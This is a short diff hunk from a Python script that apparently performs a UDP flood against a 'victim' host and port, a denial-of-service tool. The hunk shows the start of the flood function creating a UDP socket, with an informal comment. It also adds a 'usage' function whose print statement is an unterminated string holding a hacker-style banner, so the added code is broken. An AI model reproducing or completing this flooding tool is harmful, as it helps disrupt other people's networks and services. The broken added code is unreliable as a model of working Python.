@@ -4,6 +4,9 @@ import socket
 import random
 import sys
 
+def usage():
+    print 'LORD  TRAYLINZ  NIH  DEK    
+    
 def flood(victim, vport, duration):
     # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
